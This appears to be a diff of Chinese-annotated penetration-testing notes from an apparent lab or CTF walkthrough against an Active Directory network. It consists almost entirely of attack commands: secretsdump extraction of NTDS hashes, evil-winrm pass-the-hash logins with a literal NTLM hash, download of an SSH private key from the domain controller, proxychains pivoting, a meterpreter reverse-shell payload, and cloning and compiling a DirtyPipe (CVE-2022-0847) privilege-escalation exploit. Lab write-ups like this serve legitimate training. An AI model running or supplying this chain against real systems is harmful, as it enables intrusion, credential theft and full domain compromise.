@@ -401,7 +401,8 @@ C:\Share> $group = Convert-NameToSid "Server Admins"
 C:\Share> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
 sudo proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm      在 DC 提取 NTDS.dit 中的 NTLM 哈希
 proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2      连接到 DC
-
+  或者
+  evil-winrm -i 127.0.0.1 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2      连接到 DC
 
 用  Snaffler 搜刮
   https://github.com/SnaffCon/Snaffler
@@ -486,6 +487,7 @@ hashcat -m 5600 -O -w 3 hash /usr/share/wordlists/rockyou.txt.gz
 单独的站点或未加入域的文件共享或备份服务器来存放敏感数据
 不应该能从主域的主机直接访问，获得域管理员权限也不应
 
+evil-winrm -i 127.0.0.1 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2      连接到 DC
 *Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> ipconfig /all    查看域控制器上的网络适配器，看到第二个网卡 (NIC)，位于 172.16.9.0 网络
 *Evil-WinRM* PS C:\Department Shares\IT\Private\Networking>  1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}      扫描存活主机
 *Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" /tmp/ssmallsadm-id_rsa       下载密钥
@@ -511,13 +513,18 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_
 >> set version 4a
 编辑 /etc/proxychains.conf 使用上面指定的 9050 端口
 proxychains nmap -sT -p 22 172.16.9.25      从攻击机扫描敏感子网
-chmod 600
+*Evil-WinRM* PS C:\Users\Administrator\Documents> download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" ./ssmallsadmKey      从 DC 下载密钥
+chmod 600 ssmallsadmKey
 proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
 开始提权
+uname -a      Linux/Unix 下查看系统内核和硬件架构信息
 发现 DirtyPipe 漏洞（CVE-2022-0847）
   https://www.cisa.gov/news-events/alerts/2022/03/10/dirty-pipe-privilege-escalation-vulnerability-linux
   https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847
-wget https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cd CVE-2022-0847-DirtyPipe-Exploits/
+cat exploit-2.c | xclip -sel c
+在 DC 黏贴到 dirtypipe.c
 ssmallsadm@MGMT01:~$ gcc dirtypipe.c -o dirtypipe
 ssmallsadm@MGMT01:~$ chmod +x dirtypipe
 ssmallsadm@MGMT01:~$ find / -perm -4000 2>/dev/null      寻找 SUID 二进制文件，找到 /usr/lib/openssh/ssh-keysign
